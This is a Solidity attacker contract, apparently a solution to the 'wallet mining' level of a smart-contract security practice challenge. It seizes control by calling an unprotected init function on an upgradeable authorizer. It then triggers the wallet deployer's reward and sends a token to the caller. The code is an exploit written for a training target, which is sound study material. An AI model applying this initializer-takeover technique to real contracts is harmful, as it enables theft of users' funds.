// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {AuthorizerUpgradeable} from "../../src/wallet-mining/AuthorizerUpgradeable.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract WalletMiningAttacker {
    constructor(){

    }
    function attack(address USER_DEPOSIT_ADDRESS,AuthorizerUpgradeable authorizer, WalletDeployer walletDeployer, DamnValuableToken token, uint256 nonce, bytes memory initializer) public {
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        authorizer.init(wards, aims);
        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, nonce);
        token.transfer(msg.sender, 1 ether);
    }
}
